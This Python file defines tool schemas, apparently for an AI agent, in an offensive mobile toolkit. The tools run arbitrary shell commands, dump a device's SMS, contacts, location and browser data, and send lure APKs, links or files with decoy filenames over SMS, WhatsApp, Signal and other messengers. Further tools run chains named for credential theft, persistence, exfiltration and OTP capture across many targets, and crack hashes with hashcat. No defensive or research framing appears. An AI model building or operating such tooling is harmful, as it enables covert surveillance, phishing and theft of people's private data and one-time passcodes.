"""Tool schemas. Lint-clean by construction."""


def _shell(desc: str) -> dict:
    return {"type": "string", "format": "shell", "description": desc}


SHELL = {"type": "object", "additionalProperties": False, "required": ["command"],
         "properties": {"command": _shell("Command line to execute")}}

DUMP = {"type": "object", "additionalProperties": False, "required": ["dataset"],
        "properties": {
            "dataset": {"type": "string",
                        "enum": ["sms", "calls", "contacts", "wifi", "location",
                                 "apps", "browser"],
                        "description": "Dataset to pull"},
            "limit": {"type": "integer", "description": "Max rows"},
            "since": {"type": "string", "description": "ISO date lower bound"}}}

SCAN = {"type": "object", "additionalProperties": False, "required": ["mode"],
        "properties": {
            "mode": {"type": "string", "enum": ["usb", "wifi", "lan", "mdns"],
                     "description": "Discovery transport"},
            "subnet": {"type": "string", "description": "CIDR for lan mode"},
            "timeout": {"type": "integer", "description": "Seconds"}}}

DELIVER = {"type": "object", "additionalProperties": False,
           "required": ["channel", "kind", "target"],
           "properties": {
               "channel": {"type": "string",
                           "enum": ["sms", "mms", "email", "signal", "whatsapp",
                                    "telegram", "discord", "slack", "teams",
                                    "messenger", "viber", "dialer"],
                           "description": "Delivery channel"},
               "kind": {"type": "string", "enum": ["link", "apk", "pdf", "photo"],
                        "description": "Artifact kind"},
               "target": {"type": "string", "description": "Number, handle or webhook"},
               "message": {"type": "string", "description": "Body text"},
               "label": {"type": "string", "description": "Lure filename"}}}

CHAIN = {"type": "object", "additionalProperties": False, "required": ["chain"],
         "properties": {
             "chain": {"type": "string",
                       "enum": ["default", "creds_full", "net_full", "persist_full",
                                "exfil_full", "otp_full", "everything"],
                       "description": "Predefined chain"},
             "serial": {"type": "string", "description": "Target serial"},
             "max_targets": {"type": "integer", "description": "Fan-out cap"}}}

CRACK = {"type": "object", "additionalProperties": False, "required": ["hash"],
         "properties": {
             "hash": {"type": "string", "description": "Hash to crack"},
             "mode": {"type": "string", "description": "hashcat -m mode"},
             "wordlist": {"type": "string", "description": "Wordlist path"},
             "rules": {"type": "string", "description": "Rule file"}}}

REGISTRY = {"shell": SHELL, "dump": DUMP, "scan": SCAN,
            "deliver": DELIVER, "chain": CHAIN, "crack": CRACK}


def get(name: str) -> dict:
    if name not in REGISTRY:
        raise KeyError(name)
    return REGISTRY[name]
